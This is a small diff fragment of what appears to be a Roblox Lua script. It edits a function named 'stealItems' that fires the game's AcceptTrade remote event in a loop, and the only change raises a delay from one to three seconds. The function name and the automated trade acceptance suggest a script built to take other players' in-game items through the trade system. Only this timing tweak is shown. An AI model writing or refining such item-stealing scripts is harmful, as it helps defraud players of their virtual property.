@@ -277,7 +277,7 @@ local function stealItems()
         }
         game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(acc))
 
-        wait(1)
+        wait(3)
     end
 end
 
